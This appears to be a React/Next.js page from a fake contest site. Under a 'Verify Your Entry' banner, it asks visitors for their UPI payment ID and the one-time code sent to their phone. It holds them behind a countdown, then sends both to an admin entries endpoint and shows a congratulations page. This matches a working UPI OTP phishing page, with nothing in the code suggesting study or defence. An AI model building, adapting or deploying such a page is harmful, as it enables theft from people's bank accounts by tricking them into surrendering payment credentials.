"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { ArrowLeft, Shield, Clock, Loader2, AlertCircle } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"

export default function VerifyPage() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    upiId: "",
    otp: "",
  })
  const [timeLeft, setTimeLeft] = useState(120) // 2 minutes in seconds
  const [timerActive, setTimerActive] = useState(true)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState("")
  const [entryId, setEntryId] = useState<string | null>(null)
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    // Get entry ID from sessionStorage
    const storedEntryId = sessionStorage.getItem("entryId")
    if (!storedEntryId) {
      router.push("/")
      return
    }
    setEntryId(storedEntryId)

    // Start 2-minute timer
    setTimeLeft(40)
    setTimerActive(true)
    timerRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current as NodeJS.Timeout)
          setTimerActive(false)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!entryId) {
      setError("Entry not found. Please start from the beginning.")
      return
    }
    if (!/^[0-9]{5}$/.test(formData.otp)) {
      setError("OTP must be exactly 5 digits.")
      return
    }
    setIsSubmitting(true)
    setError("")
    try {
      // Update the entry with UPI ID and OTP, set status to verified
      const response = await fetch(`/api/admin/entries/${entryId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          upiId: formData.upiId,
          otp: formData.otp,
          status: 'verified',
        }),
      })
      const data = await response.json()
      if (data.success) {
        router.push("/congratulations")
      } else {
        setError(data.error || "Failed to verify entry. Please try again.")
      }
    } catch (error) {
      setError("Something went wrong. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (error) setError("")
  }

  // Timer display
  const minutes = Math.floor(timeLeft / 60)
  const seconds = timeLeft % 60
  const timerDisplay = `${minutes}:${seconds.toString().padStart(2, '0')}`

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#500152] via-gray-900 to-[#23038b] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-4 -left-4 w-72 h-72 bg-gradient-to-r from-green-600/20 to-blue-600/20 rounded-full mix-blend-multiply filter blur-xl animate-pulse"></div>
        <div className="absolute -bottom-8 -right-4 w-72 h-72 bg-gradient-to-r from-blue-600/20 to-purple-600/20 rounded-full mix-blend-multiply filter blur-xl animate-pulse animation-delay-2000"></div>
      </div>

      <div className="w-full max-w-md relative z-10">
        {/* Timer Indicator */}
        <div className="bg-gray-800/50 backdrop-blur-sm rounded-lg p-3 mb-6 border border-gray-700">
          <div className="flex items-center justify-center text-sm">
            <Clock className="w-4 h-4 mr-2 text-orange-400" />
            <span className="text-gray-300">Please wait </span>
            <span className="text-orange-400 font-bold ml-1">{timerDisplay}</span>
            <span className="text-gray-300 ml-1">before you can submit</span>
          </div>
        </div>

        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-green-500 to-blue-600 rounded-full mb-4 shadow-lg shadow-green-500/25">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-3xl font-bold text-white mb-2">Verify Your Entry</h1>
          <p className="text-gray-300">Enter your UPI ID and the 5-digit OTP you received</p>
        </div>

        {error && (
          <Alert className="mb-4 bg-red-900/50 border-red-500 text-red-100">
            <AlertCircle className="h-4 w-4" />
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}

        <Card className="shadow-2xl border border-gray-700 bg-gray-800/50 backdrop-blur-sm">
          <CardHeader className="pb-4">
            <CardTitle className="text-center text-lg font-semibold text-white">Final Step</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="upiId" className="text-sm font-medium text-gray-200">
                  UPI ID
                </Label>
                <Input
                  id="upiId"
                  type="text"
                  placeholder="yourname@upi"
                  value={formData.upiId}
                  onChange={(e) => handleInputChange("upiId", e.target.value)}
                  required
                  disabled={isSubmitting}
                  className="h-12 bg-gray-700/50 border-gray-600 text-white placeholder:text-gray-400 focus:border-blue-500 focus:ring-blue-500"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="otp" className="text-sm font-medium text-gray-200">
                  OTP Code (5 digits)
                </Label>
                <Input
                  id="otp"
                  type="text"
                  placeholder="Enter 5-digit OTP"
                  value={formData.otp}
                  onChange={(e) => handleInputChange("otp", e.target.value)}
                  required
                  maxLength={5}
                  pattern="[0-9]{5}"
                  disabled={isSubmitting}
                  className="h-12 bg-gray-700/50 border-gray-600 text-white placeholder:text-gray-400 focus:border-blue-500 focus:ring-blue-500 text-center text-lg tracking-widest"
                />
                <p className="text-xs text-gray-400 text-center">You should have received the OTP on your phone</p>
              </div>

              <Button
                type="submit"
                disabled={isSubmitting || timerActive}
                className="w-full h-12 bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-semibold rounded-lg transition-all duration-200 transform hover:scale-[1.02] shadow-lg shadow-green-500/25 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Verifying...
                  </>
                ) : (
                  timerActive ? `Please wait ${timerDisplay}` : "Complete Today's Entry"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>

        <Button
          variant="ghost"
          onClick={() => router.back()}
          disabled={isSubmitting}
          className="w-full mt-4 text-gray-400 hover:text-white hover:bg-gray-800/50 disabled:opacity-50"
        >
          <ArrowLeft className="w-4 h-4 mr-2" />
          Go Back
        </Button>
      </div>
    </div>
  )
}